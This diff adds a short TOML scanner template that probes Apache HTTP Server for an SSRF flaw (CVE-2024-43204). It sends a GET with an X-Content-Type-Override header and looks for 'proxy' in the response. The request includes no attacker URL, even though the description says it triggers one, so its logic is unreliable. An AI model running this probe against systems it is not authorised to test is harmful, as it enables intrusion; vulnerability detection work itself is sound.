@@ -1,0 +1,31 @@
+[info]
+author = "ave"
+description = "检测 Apache HTTP Server 是否存在 mod_proxy + mod_headers 配置缺陷导致的 SSRF 漏洞（CVE-2024-43204），通过发送带有 X-Content-Type-Override 头的请求触发服务器向攻击者可控 URL 发起出站代理请求"
+id = "POC-AVE-2024-0510"
+name = "Apache HTTP Server mod_headers SSRF PoC"
+severity = "high"
+tags = ["ave-2024-0510"]
+vuln_id = [
+    "CVE-2024-43204",
+    "AVE-2024-0510",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/"
+protocol = "http"
+
+[poc.requests.headers]
+X-Content-Type-Override = "text/plain; charset=iso-8859-1"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "ProxyError",
+    "proxy",
+]
